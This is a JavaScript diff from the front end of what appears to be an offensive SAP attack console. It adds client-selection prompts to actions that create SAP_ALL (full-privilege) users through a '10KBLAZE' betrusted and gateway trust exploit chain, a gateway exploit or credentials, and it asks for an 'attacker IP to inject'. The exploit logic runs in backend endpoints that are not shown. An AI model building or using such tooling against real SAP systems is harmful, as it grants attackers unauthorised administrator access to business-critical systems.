@@ -1789,20 +1789,52 @@ async function ctxAction(action) {
     case 'create_user_betrusted': {
       const n = (mapState.nodes || {})[sid];
       const msPort = n && n.ms_port ? n.ms_port : '39NN';
+      const clients_bt = (n && n.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
+      let defBt = clients_bt.find(c => c !== '000') || clients_bt[0] || '001';
       const ip = prompt(
         `10KBLAZE Full Chain: betrusted → GW trust → create user\nMS port: ${msPort}\n\n` +
         `Enter attacker IP to inject (leave blank to auto-detect):`, ''
       );
-      if (ip !== null) {
-        await api('POST', `node/${sid}/betrusted_chain`,
-                  { attacker_ip: ip.trim(), nilist_wait: 30 });
-      }
+      if (ip === null) break;
+      const clientBt = prompt(
+        `Create user in which client?\n\n` +
+        (clients_bt.length > 0 ? `Known clients: ${clients_bt.join(', ')}\n` : '') +
+        `(User will be created with SAP_ALL)`,
+        defBt
+      );
+      if (clientBt === null) break;
+      await api('POST', `node/${sid}/betrusted_chain`,
+                { attacker_ip: ip.trim(), nilist_wait: 30, client: clientBt.trim() });
       break;
     }
-    case 'create_user_gw':
-      await api('POST', `node/${sid}/create_user`, { method: 'gw_exploit' }); break;
-    case 'create_user_creds':
-      await api('POST', `node/${sid}/create_user`, { method: 'credentials' }); break;
+    case 'create_user_gw': {
+      const n_gw = (mapState.nodes || {})[sid];
+      const clients_gw = (n_gw && n_gw.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
+      let defaultClient = clients_gw.find(c => c !== '000') || clients_gw[0] || '001';
+      const clientGw = prompt(
+        `Create user in which client?\n\n` +
+        (clients_gw.length > 0 ? `Known clients: ${clients_gw.join(', ')}\n` : '') +
+        `(User will be created with SAP_ALL via GW exploit)`,
+        defaultClient
+      );
+      if (clientGw === null) break;
+      await api('POST', `node/${sid}/create_user`, { method: 'gw_exploit', client: clientGw.trim() });
+      break;
+    }
+    case 'create_user_creds': {
+      const n_cr = (mapState.nodes || {})[sid];
+      const clients_cr = (n_cr && n_cr.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
+      let defCr = clients_cr.find(c => c !== '000') || clients_cr[0] || '001';
+      const clientCr = prompt(
+        `Create user in which client?\n\n` +
+        (clients_cr.length > 0 ? `Known clients: ${clients_cr.join(', ')}\n` : '') +
+        `(User will be created via BAPI with credentials)`,
+        defCr
+      );
+      if (clientCr === null) break;
+      await api('POST', `node/${sid}/create_user`, { method: 'credentials', client: clientCr.trim() });
+      break;
+    }
     case 'lpe':
       await api('POST', `node/${sid}/lpe`); break;
     case 'deep_scan':
